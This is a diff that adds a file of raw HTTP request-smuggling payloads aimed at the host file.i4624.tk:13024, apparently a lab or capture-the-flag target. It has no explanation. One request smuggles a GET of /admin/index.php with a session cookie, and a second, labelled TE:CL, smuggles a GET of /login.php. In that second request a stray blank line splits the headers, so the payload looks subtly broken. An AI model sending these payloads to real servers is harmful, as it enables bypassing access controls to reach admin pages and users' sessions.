@@ -1,0 +1,46 @@
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Cache-Control: max-age=0
+Content-Length: 190
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+1
+
+GET /admin/index.php HTTP/1.1
+Host: file.i4624.tk:13024
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=84847ae56a2ffd7da873f82bd51baf38
+Content-Length: 5
+
+0
+
+
+===TE:CL ===
+
+POST /post.php HTTP/1.1
+Host: file.i4624.tk:13024
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+
+Cache-Control: max-age=0
+Content-Length: 4
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+7c
+GET /login.php HTTP/1.1
+Host: file.i4624.tk:13024
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
